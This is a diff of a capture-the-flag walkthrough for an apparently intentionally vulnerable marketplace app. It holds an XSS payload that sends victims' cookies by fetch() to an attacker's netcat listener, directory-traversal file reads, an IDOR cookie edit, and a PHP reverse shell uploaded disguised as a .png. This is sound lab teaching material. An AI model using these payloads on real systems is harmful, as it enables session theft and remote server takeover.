@@ -43,31 +43,37 @@ This walkthrough provides a step-by-step guide on how to solve all the flags hid
 **Flag Location**: In another user’s session cookies.
 
 ### Steps:
-1. Create an XSS payload that sends cookies a server you control
-   ```<script>
+1. Make sure that auto_bot.py is running!
+2. Create an XSS payload that sends cookies a server you control
+   ```
+   <script>
    fetch('http://127.0.0.1:1234', {  // CHANGE THIS TO YOUR IP
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
    });
-   </script>```
+   </script>
+   ```
    You can find this same exact code in /vulns/xss vuln/stored_xss_vuln.html
-
-2. Install netcat (preferably on a linux instance) and set it to listen mode
-   ```nc -lvnp 1234```
-   ![alt text](readme_images/7.png)
 
 3. Navigate to /
 ![alt text](readme_images/4.png)
 
 4. Choose the first offer that has higher traffic than other offer
-
 ![alt text](readme_images/5.png)
 
 5. Add the XSS payload as a review
 ![alt text](readme_images/6.png)
 
-6. Look at your listener and extract the flag along with the cookies
+6. Navigate to /Profile (to avoid trigering your own payload)
+
+7. Install netcat (preferably on a linux instance) and set it to listen mode and wait for approximately 30 seconds
+
+   ```nc -lvnp 1234```
+   ![alt text](readme_images/7.png)
+
+
+8. Look at your listener and extract the flag along with the cookies
 ![alt text](readme_images/8.png)
 
 ---
@@ -75,23 +81,37 @@ This walkthrough provides a step-by-step guide on how to solve all the flags hid
 ## Flag 3: Client-Side Validation Bypass
 
 **Vulnerability Type**: Client-Side Validation Bypass  
-**Flag Location**: /Profile page.
+**Flag Location**: /
 
 ### Steps:
-1. Go to the page where you can purchase items (likely through the shop interface).
-2. Examine the client-side code (JavaScript) for validation checks (e.g., checking available funds).
-3. Modify the client-side code to bypass or adjust the validation (using browser developer tools).
-4. Complete the transaction and navigate to your profile (/Profile) to view the flag.
+1. Navigate to /Profile and and log in before navigating back to /
+2. Choose the flag from the offers and open inspect element
+![alt text](readme_images/9.png)
+3. Find the script that is responsible for buying the offer
+![alt text](readme_images/10.png)
+
+
+4. Modify the function's code to bypass the money check
+Before: ![alt text](readme_images/11.png) After: ![alt text](readme_images/12.png)
+4. Buy the flag
 
 ---
 
 ## Flag 4: Insecure Direct Object References (IDOR)
 
 **Vulnerability Type**: IDOR  
-**Flag Location**: Accessing user account with ID=1.
+**Flag Location**: Shown after accessing user account with ID=1.
 
 ### Steps:
-1. Find a URL or API endpoint where the user ID is exposed (e.g., `/user?id=2`).
+1. Go to /Profile and make sure you're not shown the login page, but your profile data
+![alt text](readme_images/25.png)
+
+2. Go to inspect element and look at your cookies
+![alt text](readme_images/26.png)
+
+3. Change user_id value to '2' and refresh the page
+
+
 2. Change the ID parameter in the URL to `1` (e.g., `/user?id=1`).
 3. Access the page and look for a flag displayed in the user’s profile or data.
 
@@ -113,27 +133,71 @@ This walkthrough provides a step-by-step guide on how to solve all the flags hid
 
 ## Flag 6: Local File Inclusion (LFI)
 
-**Vulnerability Type**: LFI  
-**Flag Location**: C:\Windows\System32\drivers\etc\hosts
+**Vulnerability Type**: LFI
+**Flag Location**: /server/marketplace_images/FLAG.txt
 
 ### Steps:
-1. Look for a poorly sanitized file inclusion endpoint (e.g., `/viewfile?filename=`).
-2. Manipulate the `filename` parameter to point to system files (e.g., `../../../etc/hosts`).
-3. Access the file and find the flag hidden in the contents.
+1. At /, look at the javascript code in the header and find a script that might have a weak api endpoint
+![alt text](readme_images/13.png)
+
+This line may be of interest to us:
+
+```const imageResponse = await fetch(`/api/get_image.php?filename=${filename}`);```
+
+As we can see, the front-end uses an api that takes 'filename' as one of it's arguments.
+
+2. Navigate to /api/get_image.php
+![alt text](readme_images/14.png)
+
+At first we get a File Not Found error, but do not let this fool you. If you add the filename paramater with a valid filename, you actually a response from the server.
+Let's try it with 'C:\Windows\System32\drivers\etc\hosts'
+![alt text](readme_images/15.png)
+
+It seems that the server can't find the specified file, but that is to be expected. We can remove 'C:\' and from the query and add many '/../' to the start to try a directory traversal attack.
+![alt text](readme_images/16.png)
+
+Success! It seem we got a response though not a very useful one. If you analyse closely, you find that the response ends in '==', which is a telltale sign of base64 encoding (you also could've found this by looking at the js code we found earlier).
+
+3. Decode the base64 and read the file
+![alt text](readme_images/17.png)
+
+We are now able to read basically any file from the server.
+
+You can find the flag by reading specifying the filename as 'flag.txt' and decoding the base64 output.
+![alt text](readme_images/18.png)
+![alt text](readme_images/19.png)
+
 
 ---
 
 ## Flag 7: File Upload Vulnerability (RCE)
 
 **Vulnerability Type**: Remote Code Execution via File Upload  
-**Flag Location**: After gaining shell access.
+**Flag Location**: In the project's root directory in FLAG_RCE.txt
 
 ### Steps:
-1. Locate the file upload functionality.
-2. Upload a reverse shell payload (e.g., PHP, JSP, or Python).
-3. Trigger the payload to execute on the server.
-4. Gain shell access to the server and escalate privileges.
-5. Search for the flag on the server.
+There is actually another vulnerability in /api/get_image.php. This time, we're able to run php code. To do that, we need to create a new offer under /Profile
+
+1. Create a new, but choose to upload your own image.
+![alt text](readme_images/20.png)
+
+2. Download a windows compatible php reverse shell (we used this one: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php).
+
+3. Change the ip address an port in the shell file. ALSO DON'T FORGET TO CHANGE THE FILES EXTENSION TO '.png'. Otherwise, the server will not accept it.
+![alt text](readme_images/22.png)
+
+4. Upload the file and create the offer
+![alt text](readme_images/21.png)
+
+5. Run netcat in listen mode:
+
+   ```nc -lvnp 1234```
+
+6. Navigate back to '/', triggering the payload. Look at your netcat.
+![alt text](readme_images/23.png)
+
+7. Find FLAG_RCE.txt from the projects root directory and cat it's contents.
+![alt text](readme_images/23.png)
 
 ---
 
